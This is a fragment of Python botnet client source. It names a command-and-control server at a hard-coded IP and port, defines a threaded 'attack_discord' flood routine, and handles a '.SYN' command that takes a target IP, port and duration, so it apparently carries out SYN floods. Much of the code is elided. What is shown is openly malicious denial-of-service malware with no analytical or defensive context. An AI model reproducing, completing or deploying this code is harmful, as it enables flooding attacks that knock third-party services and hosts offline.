...
KRYPTONC2_ADDRESS  = "77.90.14.157"
KRYPTONC2_PORT  = 5511
                    ...
                    def attack_discord(ip, port, secs):
                        ...
                        while time.time() < secs:
                            try:
                                ...
                                print(f"Discord saldırısı sırasında hata: {e}")

                    for _ in range(threads):
                        threading.Thread(target=attack_discord, args=(ip, port, secs), daemon=True).start()
                elif command == '.SYN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
